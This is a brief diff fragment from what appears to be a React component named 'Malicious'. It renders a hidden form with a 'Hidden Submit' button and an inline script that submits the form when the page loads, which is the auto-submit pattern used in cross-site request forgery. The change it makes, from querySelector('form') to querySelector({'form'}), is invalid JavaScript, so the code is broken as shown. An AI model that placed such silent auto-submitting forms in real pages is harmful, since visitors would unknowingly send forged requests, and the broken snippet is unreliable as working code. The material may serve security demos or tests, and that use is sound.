@@ -20,7 +20,7 @@ function Malicious() {
         <button type="submit">Hidden Submit</button>
       </form>
       <script>
-        document.querySelector('form').submit();
+        document.querySelector({'form'}).submit();
       </script>
     </div>
   );
